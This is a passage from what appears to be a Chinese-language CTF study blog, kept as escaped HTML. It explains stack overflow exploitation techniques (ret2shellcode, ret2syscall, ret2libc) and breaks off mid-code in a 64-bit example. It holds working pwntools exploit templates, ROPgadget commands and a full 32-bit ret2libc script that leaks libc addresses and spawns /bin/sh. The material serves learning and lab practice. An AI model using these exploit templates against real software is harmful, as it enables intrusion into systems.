punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; shellcode&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;溢出地址&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 填充偏移量，如果 offset&gt;shellcode, 继续填充垃圾字节&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ret2syscall&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2syscall&#34;&gt;#&lt;/a&gt; ret2syscall&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;在 ret2shellcode 条件下开了 NX 保护的时候用&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理：&lt;/h2&gt;
&lt;p&gt;利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程&lt;br&gt;
 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。&lt;br&gt;
x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mov eax,&lt;br&gt;
0xb mov ebx,&lt;br&gt;
[“/bin/sh”]&lt;br&gt;
mov ecx,&lt;br&gt;
0 mov edx,&lt;br&gt;
0 int 0x80&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;转自某一个博客：在 Linux 中，系统调用通常通过 int 80h 汇编代码实现，int 终端，80h 则是代指的系统调用的终端符号，当程序执行到 int 80h 时，就会将相应的通用寄存器 eax 中的参数作为系统调用的调用号，其他寄存器中的值或者地址所指向的值作为参数（execve (&amp;quot;/bin/sh&amp;quot;,NULL,NULL)  ） //（32 位程序）&lt;br&gt;
所以我们的目标 -&amp;gt; 调用 execve ()&lt;/p&gt;
&lt;div class=&#34;note warning&#34;&gt;
&lt;p&gt;!!! 如何调用 execve () 函数&lt;br&gt;
系统调用号，即 eax 应该为 0xb&lt;br&gt;
 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。&lt;br&gt;
第二个参数，即 ecx 应该为 0&lt;br&gt;
 第三个参数，即 edx 应该为 0&lt;/p&gt;
&lt;/div&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;使用gdb&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;寻找控制 eax 的 gadgets&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ROPgadget&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;binary 文件名  &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;only &#39;pop&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;ret&#39; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;token char&#34;&gt;&#39;eax&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;2.&lt;/span&gt;ebx，edx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;ecx的ret&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ROPgadget&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;binary 文件名  &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;only &#39;pop&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;ret&#39; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;token char&#34;&gt;&#39;ebx&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    #或者直接&lt;span class=&#34;token class-name&#34;&gt;ROPgadget&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;binary 文件名  &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;only &#39;pop&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;ret&#39;查看所有的&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;3.&lt;/span&gt;获得 &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;bin&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sh 字符串对应的地址。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ROPgadget&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;binary 文件名  &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;string &#39;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;bin&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sh&#39; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;4.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt; 的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ROPgadget&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;binary r文件名  &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;only &lt;span class=&#34;token char&#34;&gt;&#39;int&#39;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    最后的payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;垃圾字节&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;（eax&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ret&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ebx&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ret&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ecx&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ret&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;edx&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ret&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;bin&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sh&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;）&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ret2libc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2libc&#34;&gt;#&lt;/a&gt; ret2libc&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;没有后门函数同时开启 NX 保护&lt;/em&gt;&lt;br&gt;
&lt;em&gt;一般有 puts ()、printf ()、writes () 等，且使用了 libc 库&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jvc3NmcmFuay9hcnRpY2xlL2RldGFpbHMvMTM0ODcyNDAz&#34;&gt;取自大佬博客！！我愿称之为神！大彻大悟！醍醐灌顶！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;函数的真实地址   =   基地址   +   偏移地址&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/gSdqK57pXoLvDkU.jpg&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;先上板子&lt;/p&gt;
&lt;h2 id=&#34;32位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32位&#34;&gt;#&lt;/a&gt; 32 位&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./ret2libc3_32&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/lib/i386-linux-gnu/libc.so.6&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; #确定libc库并解析&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./ret2libc3_32&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;puts_plt &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;plt&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;puts&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; #puts函数的入口地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;puts_got &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;puts&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  #puts函数的got表地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;start_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;_start&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; #程序的起始地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;112&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;start_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#&lt;span class=&#34;token function&#34;&gt;attach&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b *0x0804868F&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#&lt;span class=&#34;token function&#34;&gt;pause&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Can you find it !?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;puts_real_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  #接收puts的真实地址，占&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;个字节&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;puts_plt:&amp;#123;&amp;#125;, puts_got: &amp;#123;&amp;#125;, start_addr: &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;start_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;puts_real_addr: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_real_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; puts_real_addr &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;puts&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; #计算libc库的基地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;system_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libc_addr &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; #计算system函数的真实地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binsh_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libc_addr &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token string&#34;&gt;&#34;/bin/sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  #计算binsh字符串的真实地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;112&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b&lt;span class=&#34;token string&#34;&gt;&#34;aaaa&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#&lt;span class=&#34;token function&#34;&gt;pause&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;64位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位&#34;&gt;#&lt;/a&gt; 64 位&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; offset #垃圾数据的填充&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pop_rdi_ret_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; #用寄存器rdi传参，参数是read_got&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;read_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; #想要存入rdi的参数&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token 